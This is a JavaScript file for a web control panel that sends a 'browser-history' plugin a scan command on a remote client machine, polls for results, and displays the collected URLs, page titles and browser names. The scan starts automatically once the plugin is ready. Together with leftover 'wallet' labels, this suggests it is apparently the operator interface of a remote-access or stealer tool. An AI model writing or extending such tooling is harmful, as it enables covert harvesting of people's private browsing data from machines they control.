const params = new URLSearchParams(window.location.search);
const clientIdInput = document.getElementById("client-id");
const scanBtn = document.getElementById("scan-btn");
const statusPill = document.getElementById("status-pill");
const countBadge = document.getElementById("count-badge");
const resultsArea = document.getElementById("results-area");
const logEl = document.getElementById("log");

const pluginId = "browser-history";
const clientId = params.get("clientId") || "";
clientIdInput.value = clientId;

let pollTimer = null;

// ─── Logging ──────────────────────────────────────────────────────────────────

function log(line) {
  const ts = new Date().toISOString();
  logEl.textContent = `${ts}  ${line}\n` + logEl.textContent;
}

// ─── Status pill helpers ───────────────────────────────────────────────────────

function setStatus(text, cls) {
  statusPill.textContent = text;
  statusPill.className = "status-pill " + cls;
}

// ─── API helpers ───────────────────────────────────────────────────────────────

async function sendPluginEvent(event, payload) {
  if (!clientId) { log("Missing clientId"); return; }
  const res = await fetch(
    `/api/clients/${encodeURIComponent(clientId)}/plugins/${pluginId}/event`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event, payload }),
    }
  );
  if (!res.ok) {
    const text = await res.text();
    log(`sendEvent failed: ${res.status} ${text}`);
  }
}

async function pollEvents() {
  if (!clientId) return;
  try {
    const res = await fetch(
      `/api/clients/${encodeURIComponent(clientId)}/plugins/${pluginId}/events`,
      { method: "GET" }
    );
    if (!res.ok) {
      log(`poll failed: ${res.status}`);
      return;
    }
    const data = await res.json();
    for (const item of data.events || []) {
      handleIncomingEvent(item.event, item.payload);
    }
  } catch (err) {
    log(`poll error: ${err.message}`);
  }
}

// ─── Render results ────────────────────────────────────────────────────────────

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function extractDomain(url) {
  try {
    return new URL(url).hostname.replace(/^www\./, "");
  } catch (_) {
    return url;
  }
}

function renderResults(entries, scannedAt, total) {
  countBadge.textContent = String(total);
  countBadge.classList.toggle("hidden", total === 0);

  if (total === 0) {
    resultsArea.innerHTML = `<p class="no-wallets">&#x2714; No browsing history found on this machine.</p>`;
    return;
  }

  // Group by first letter of domain
  const groups = {};
  for (const e of entries) {
    const domain = extractDomain(e.url);
    const letter = (domain[0] || "#").toUpperCase();
    if (!groups[letter]) groups[letter] = [];
    groups[letter].push(e);
  }

  const letters = Object.keys(groups).sort();
  let html = "";

  for (const letter of letters) {
    const items = groups[letter];
    const rows = items
      .map(
        (e) => `<tr>
          <td class="url-cell"><a href="${escapeHtml(e.url)}" target="_blank" rel="noopener noreferrer">${escapeHtml(e.url)}</a></td>
          <td class="title-cell">${escapeHtml(e.title || "")}</td>
          <td class="source-cell">${escapeHtml(e.source)}</td>
        </tr>`
      )
      .join("");

    html += `
      <div class="category-group">
        <div class="category-title cat-letter">
          <span class="cat-dot"></span>${escapeHtml(letter)} (${items.length})
        </div>
        <table class="wallet-table">
          <thead><tr><th>URL</th><th>Title</th><th>Browser</th></tr></thead>
          <tbody>${rows}</tbody>
        </table>
      </div>`;
  }

  resultsArea.innerHTML = html;
}

// ─── Handle incoming plugin events ────────────────────────────────────────────

function handleIncomingEvent(event, payload) {
  if (event === "ready") {
    log("Plugin ready on client — auto-scan started");
    setStatus("Scanning\u2026", "status-scanning");
  } else if (event === "history_result") {
    stopPolling();
    const total = payload?.total ?? 0;
    const entries = payload?.entries ?? [];
    const scannedAt = payload?.scannedAt ?? "";

    log(`Scan complete at ${scannedAt} — ${total} URL(s) found`);

    if (total > 0) {
      setStatus(`${total} URL(s) found`, "status-found");
    } else {
      setStatus("No history found", "status-clean");
    }

    renderResults(entries, scannedAt, total);
    scanBtn.disabled = false;
  } else {
    log(`Event: ${event} \u2192 ${JSON.stringify(payload)}`);
  }
}

// ─── Polling control ──────────────────────────────────────────────────────────

function startPolling() {
  stopPolling();
  pollTimer = setInterval(pollEvents, 2000);
  void pollEvents();
}

function stopPolling() {
  if (pollTimer !== null) {
    clearInterval(pollTimer);
    pollTimer = null;
  }
}

// ─── Scan button ──────────────────────────────────────────────────────────────

scanBtn.addEventListener("click", async () => {
  if (!clientId) {
    log("No clientId in URL");
    return;
  }
  scanBtn.disabled = true;
  setStatus("Scanning\u2026", "status-scanning");
  log("Manual scan triggered");
  await sendPluginEvent("scan", {});
  startPolling();
});

// ─── Init ─────────────────────────────────────────────────────────────────────

if (!clientId) {
  log("No clientId provided in URL — open this page from a client context");
  setStatus("No client selected", "status-idle");
} else {
  log(`Client: ${clientId}`);
  log("Waiting for auto-scan result\u2026");
  setStatus("Awaiting auto-scan\u2026", "status-scanning");
  startPolling();
}
